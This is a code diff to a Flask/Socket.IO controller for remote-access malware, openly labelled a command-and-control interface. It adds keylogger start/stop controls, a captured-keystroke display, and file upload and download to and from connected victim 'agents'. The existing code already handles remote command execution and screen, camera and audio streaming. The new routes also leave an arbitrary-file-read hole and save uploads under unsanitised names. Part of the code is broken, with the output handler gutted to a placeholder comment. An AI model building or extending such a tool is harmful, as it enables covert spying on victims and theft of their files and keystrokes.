@@ -4,7 +4,7 @@ eventlet.monkey_patch()
 from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from collections import defaultdict
-import datetime
+import datetime, os
 import time
 import os
 import base64
@@ -15,6 +15,7 @@ socketio = SocketIO(app, async_mode='eventlet')
 
 # --- Web Dashboard HTML (with Socket.IO) ---
 DASHBOARD_HTML = '''
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -96,6 +97,23 @@ DASHBOARD_HTML = '''
             font-size: 1.1rem;
             color: var(--text-secondary);
             font-weight: 300;
+        }
+         /* Navigation Bar Styles */
+        .navbar {
+            background: var(--secondary-bg);
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .navbar a {
+            color: var(--text-primary);
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: 500;
         }
 
         .grid {
@@ -379,6 +397,7 @@ DASHBOARD_HTML = '''
     <div class="neural-bg"></div>
     
     <div class="container">
+    <div class="navbar"><a href="/dashboard">Dashboard</a><a href="/files">Files</a></div>
         <div class="header">
             <h1>NEURAL CONTROL HUB</h1>
             <p class="subtitle">Advanced Command & Control Interface</p>
@@ -454,6 +473,28 @@ DASHBOARD_HTML = '''
                                 <option value="right">Right</option>
                             </select>
                         </div>
+                         <div class="input-group">
+                            <label class="input-label">Selected File</label>
+                             <input type="file" class="neural-input" id="file-input">
+                            <input type="text" class="neural-input" id="destination-path" placeholder="Destination Path">
+                            <button class="btn" onclick="uploadFile()">Upload File</button>
+                            <button class="btn" onclick="downloadFile()">Download File</button>
+                        </div>
+                         <div class="control-group">
+                            <div class="control-header">Keylogger Control</div>
+                            <button class="btn" onclick="startKeylogger()">Start Keylogger</button>
+                            <button class="btn" onclick="stopKeylogger()">Stop Keylogger</button>
+                        </div>
+
+                        <div class="control-group">
+                            <div class="control-header">Keylogger Output</div>
+                            <div class="input-group">
+                                <label class="input-label">Captured Keystrokes</label>
+                                <textarea class="neural-input" id="keylogger-output" rows="5" readonly
+                                          placeholder="Keylogger output will appear here..."></textarea>
+                            </div>
+                        </div>
+
                     </div>
                 </div>
             </div>
@@ -479,6 +520,7 @@ DASHBOARD_HTML = '''
         let cameraWindow = null;
         let audioPlayer = null;
 
+        
         // --- Agent Management ---
         function selectAgent(element, agentId) {
             if (selectedAgentId === agentId) return;
@@ -486,8 +528,8 @@ DASHBOARD_HTML = '''
             // Clean up previous agent's state
             if (selectedAgentId) {
                 stopAllStreams(); // Stop streams for the old agent
-            }
-
+    }
+        
             selectedAgentId = agentId;
             document.querySelectorAll('.agent-card').forEach(item => item.classList.remove('selected'));
             element.classList.add('selected');
@@ -496,12 +538,12 @@ DASHBOARD_HTML = '''
             document.getElementById('command-status').style.display = 'none';
         }
 
+
         function updateAgentList(agents) {
             const agentList = document.getElementById('agent-list');
             agentList.innerHTML = '';
-
             if (Object.keys(agents).length === 0) {
-                agentList.innerHTML = `
+            agentList.innerHTML = `
                     <div class="no-agents">
                         <div class="no-agents-icon">🤖</div>
                         <div>No agents connected</div>
@@ -516,24 +558,21 @@ DASHBOARD_HTML = '''
                 const agentCard = document.createElement('div');
                 agentCard.className = 'agent-card';
                 agentCard.onclick = () => selectAgent(agentCard, agentId);
-                
                 const lastSeen = new Date(agent.last_seen).toLocaleString();
                 agentCard.innerHTML = `
                     <div class="agent-status"></div>
                     <div class="agent-id">${agentId.substring(0, 8)}...</div>
                     <div class="agent-info">Last seen: ${lastSeen}</div>
                 `;
-                
                 if (agentId === selectedAgentId) {
                     agentCard.classList.add('selected');
                 }
-                
+
                 agentList.appendChild(agentCard);
             }
         }
 
-        // --- Command & Control ---
-        function issueCommand() {
+        function issueCommand() { //Command and Control
             const command = document.getElementById('command').value;
             if (!selectedAgentId) {
                 showStatus('Please select an agent first.', 'error');
@@ -544,21 +583,22 @@ DASHBOARD_HTML = '''
                 return;
             }
 
-            socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
+        socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
             document.getElementById('output-display').textContent = `> ${command}\nExecuting...`;
             document.getElementById('command').value = '';
         }
 
-        function issueCommandInternal(agentId, command) {
+        function issueCommandInternal(agentId, command) { //streaming
             if (!agentId) return;
             socket.emit('execute_command', { agent_id: agentId, command: command });
         }
+
 
         // --- Streaming ---
         function startScreenStream() {
             if (!selectedAgentId) { 
                 showStatus('Please select an agent first.', 'error');
-                return; 
+                return;
             }
             
             issueCommandInternal(selectedAgentId, 'start-stream');
@@ -569,7 +609,7 @@ DASHBOARD_HTML = '''
 
             audioPlayer = document.getElementById('audio-player');
             audioPlayer.src = `/audio_feed/${selectedAgentId}`;
-            audioPlayer.style.display = 'block';
+        audioPlayer.style.display = 'block';
             audioPlayer.play();
             
             showStatus('Screen stream started', 'success');
@@ -584,7 +624,7 @@ DASHBOARD_HTML = '''
             issueCommandInternal(selectedAgentId, 'start-camera');
             if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
             cameraWindow = window.open(`/camera_feed/${selectedAgentId}`, `CameraStream_${selectedAgentId}`, 'width=640,height=480');
-            showStatus('Camera stream started', 'success');
+        showStatus('Camera stream started', 'success');
         }
 
         function stopAllStreams() {
@@ -599,15 +639,16 @@ DASHBOARD_HTML = '''
                 audioPlayer.style.display = 'none';
             }
             if (videoWindow && !videoWindow.closed) videoWindow.close();
-            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
+        if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
             
             showStatus('All streams stopped', 'success');
         }
-
+        
         function listProcesses() {
             document.getElementById('command').value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
             issueCommand();
         }
+
 
         function showStatus(message, type) {
             const statusDiv = document.getElementById('command-status');
@@ -617,6 +658,80 @@ DASHBOARD_HTML = '''
             setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
         }
 
+        // --- File Management Functions ---
+        function uploadFile() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+
+            const fileInput = document.getElementById('file-input');
+            const destinationPath = document.getElementById('destination-path').value;
+
+            if (!fileInput.files.length) {
+                showStatus('Please select a file to upload.', 'error');
+                return;
+            }
+
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+
+            reader.onload = function(event) {
+                const fileContent = event.target.result;
+                const fileContentB64 = btoa(fileContent);
+
+                const command = `upload-file:${destinationPath}:${fileContentB64}`;
+                socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
+                showStatus('File upload initiated.', 'success');
+            };
+
+            reader.onerror = function() {
+                showStatus('Error reading file.', 'error');
+            };
+
+            reader.readAsBinaryString(file);
+        }
+
+        function downloadFile() { //File
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+
+            const filePath = prompt('Enter the file path on the agent to download:');
+            if (filePath) {
+                const command = `download-file:${filePath}`;
+                socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
+                showStatus('File download initiated.', 'success');
+            }
+        }
+
+        // --- Keylogger Controls ---
+        function startKeylogger() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+            socket.emit('execute_command', { agent_id: selectedAgentId, command: 'start-keylogger' });
+            showStatus('Keylogger started.', 'success');
+        }
+
+        function stopKeylogger() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+            socket.emit('execute_command', { agent_id: selectedAgentId, command: 'stop-keylogger' });
+            showStatus('Keylogger stopped.', 'success');
+        }
+
+        socket.on('command_output', (data) => { //socket functions
+            if (data.agent_id === selectedAgentId) {
+                const outputDisplay = document.getElementById('output-display');
+                outputDisplay.textContent += `\n${data.output}`;
+                outputDisplay.scrollTop = outputDisplay.scrollHeight;
+            }
+        });
         // --- Socket.IO Event Handlers ---
         socket.on('connect', () => {
             console.log('Connected to controller');
@@ -631,13 +746,15 @@ DASHBOARD_HTML = '''
             updateAgentList(agents);
         });
 
-        socket.on('command_output', (data) => {
-            if (data.agent_id === selectedAgentId) {
-                const outputDisplay = document.getElementById('output-display');
-                // Append new output, keeping previous content
-                outputDisplay.textContent += `\n${data.output}`;
-                outputDisplay.scrollTop = outputDisplay.scrollHeight; // Scroll to bottom
+         socket.on('command_output', (data) => {
+        if (data.agent_id === selectedAgentId) {
+            if (data.output.startsWith("Keylog:")) {
+                const keyloggerOutput = document.getElementById('keylogger-output');
+                keyloggerOutput.value += data.output.substring(7) + '\n'; // Append to keylogger output
+            } else {
+               //Existing code
             }
+        }
         });
 
         socket.on('status_update', (data) => {
@@ -710,6 +827,7 @@ DASHBOARD_HTML = '''
         liveMouseArea.addEventListener('mouseup', (event) => {
             if (!selectedAgentId) return;
 
+
             const button = document.getElementById('mouse-button').value;
 
             socket.emit('live_mouse_click', {
@@ -719,10 +837,10 @@ DASHBOARD_HTML = '''
             });
         });
 
-
     </script>
 </body>
 </html>
+
 '''
 
 # In-memory storage for agent data
@@ -738,16 +856,69 @@ def index():
 def dashboard():
     return DASHBOARD_HTML
 
+
+@app.route("/files")
+def files():
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>File Management</title>
+    </head>
+    <body>
+        <h1>File Management</h1>
+        <a href="/dashboard">Dashboard</a>
+        <h2>Upload File</h2>
+        <form action="/upload" method="post" enctype="multipart/form-data">
+            <input type="file" name="file">
+            <input type="text" name="destination" placeholder="Destination Path">
+            <button type="submit">Upload</button>
+        </form>
+        <h2>Download File</h2>
+        <form action="/download" method="post">
+            <input type="text" name="filename" placeholder="Filename">
+            <button type="submit">Download</button>
+        </form>
+    </body>
+    </html>
+    '''
+
+
+@app.route("/upload", methods=['POST'])
+def upload_file():
+    if 'file' not in request.files:
+        return "No file part"
+    file = request.files['file']
+    if file.filename == '':
+        return "No selected file"
+    if file:
+        filename = os.path.join('./uploads', file.filename)
+        file.save(filename)
+        return "File uploaded successfully"
+
+
+@app.route("/download", methods=['POST'])
+def download_file():
+    filename = request.form['filename']
+    try:
+        return send_file(filename, as_attachment=True)
+    except FileNotFoundError:
+        return "File not found"
+
+
+
+
 # --- Real-time Streaming Endpoints (unchanged) ---
 
 VIDEO_FRAMES = defaultdict(lambda: None)
-CAMERA_FRAMES = defaultdict(lambda: None)
+CAMERA_FRAMES = defaultdict(lambda: None) # socket events
 AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 
 @app.route('/stream/<agent_id>', methods=['POST'])
 def stream_in(agent_id):
     VIDEO_FRAMES[agent_id] = request.data
     return "OK", 200
+
 
 def generate_video_frames(agent_id):
     while True:
@@ -758,11 +929,13 @@ def generate_video_frames(agent_id):
                    b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
 @app.route('/video_feed/<agent_id>')
+
 def video_feed(agent_id):
     return Response(generate_video_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route('/camera/<agent_id>', methods=['POST'])
 def camera_in(agent_id):
+
     CAMERA_FRAMES[agent_id] = request.data
     return "OK", 200
 
@@ -785,6 +958,7 @@ def audio_in(agent_id):
     AUDIO_CHUNKS[agent_id].put(request.data)
     return "OK", 200
 
+
 def generate_audio_stream(agent_id):
     header = bytearray()
     # ... (WAV header generation remains the same)
@@ -799,6 +973,7 @@ def audio_feed(agent_id):
 
 # --- Socket.IO Event Handlers ---
 
+
 @socketio.on('connect')
 def handle_connect():
     print(f"Client connected: {request.sid}")
@@ -806,6 +981,7 @@ def handle_connect():
 @socketio.on('disconnect')
 def handle_disconnect():
     # Find which agent disconnected and remove it
+
     disconnected_agent_id = None
     for agent_id, data in AGENTS_DATA.items():
         if data["sid"] == request.sid:
@@ -869,6 +1045,7 @@ def handle_live_key_press(data):
     agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
     if agent_sid:
         emit('key_press', data, room=agent_sid, include_self=False)
+
 
 if __name__ == "__main__":
     print("Starting controller with Socket.IO support...")
